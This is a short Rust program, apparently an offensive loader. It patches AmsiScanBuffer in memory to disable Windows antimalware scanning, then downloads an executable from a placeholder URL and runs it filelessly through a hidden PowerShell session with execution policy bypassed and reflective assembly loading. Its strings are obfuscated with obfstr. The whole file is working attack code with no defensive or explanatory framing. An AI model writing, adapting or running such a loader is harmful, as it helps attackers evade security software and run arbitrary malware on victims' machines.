use std::{ffi::CString, ptr};
use obfstr::obfstr;
use std::process::Command;
use winapi::{
    um::{
    memoryapi::{
        VirtualProtect,
        WriteProcessMemory
    },
    libloaderapi::{
        LoadLibraryA,
        GetProcAddress
    },
    processthreadsapi::GetCurrentProcess, 
    winnt::PAGE_READWRITE
    }, 
    shared::{
        minwindef::{
            DWORD, 
            FALSE
        },
    }
};

fn main() {
    println!("{}", obfstr!("[+] Patching amsi for current process..."));

    unsafe {
        let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
        let amsi_dll = LoadLibraryA(CString::new(obfstr!("amsi")).unwrap().as_ptr());
        let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new(obfstr!("AmsiScanBuffer")).unwrap().as_ptr());
        let mut old_permissions: DWORD = 0;

        if VirtualProtect(amsi_scan_addr.cast(), 6, PAGE_READWRITE, &mut old_permissions) == FALSE {
        }
        let written: *mut usize = ptr::null_mut();

        if WriteProcessMemory(GetCurrentProcess(), amsi_scan_addr.cast(), patch.as_ptr().cast(), 6, written) == FALSE {
        }

        // Restoring the permissions.
        VirtualProtect(amsi_scan_addr.cast(), 6, old_permissions, &mut old_permissions);
        println!("{}", obfstr!("[+] AmsiScanBuffer patched!"));
    }
    let bytes =  reqwest::blocking::get(obfstr!("https://yoururl.com/csharpassembly.exe")).unwrap().bytes().unwrap();
    let script = obfstr!("[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"").to_owned() + base64::encode(bytes).as_str() + obfstr!("\")).EntryPoint.Invoke($null, $null)");
    if let Ok(_) = Command::new(obfstr!("powershell"))
        .arg(obfstr!("-NoProfile"))
        .arg(obfstr!("-WindowStyle"))
        .arg(obfstr!("Hidden"))
        .arg(obfstr!("-ExecutionPolicy"))
        .arg(obfstr!("Bypass"))
        .arg(obfstr!("-Command"))
        .arg(script)
        .output()
    {
        println!("{}",obfstr!("Command executed successfully"));
    }
}
